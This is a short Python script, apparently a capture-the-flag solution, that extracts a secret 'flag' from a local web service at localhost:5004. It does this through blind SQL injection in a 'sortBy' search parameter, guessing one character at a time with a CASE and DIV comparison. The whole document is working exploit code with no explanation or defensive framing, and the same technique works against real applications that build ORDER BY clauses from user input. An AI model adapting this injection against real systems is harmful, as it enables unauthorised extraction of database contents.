from requests import *

payload = 'case when(ascii(substring((select(value)from(flag))from({})for(1)))div({}))then(id)else(name)end'

flag = ""
idx = 1

while flag == "" or flag[-1] != '}':
    for ascii_code in range(0x20, 0x7e + 1):
        r = get('http://localhost:5004/search', params={'sortBy': payload.format(idx, ascii_code)}).json()

        if r[0]['id'] != 1:
            flag += chr(ascii_code - 1)
            print(flag[-1], end='')
            idx += 1
            break
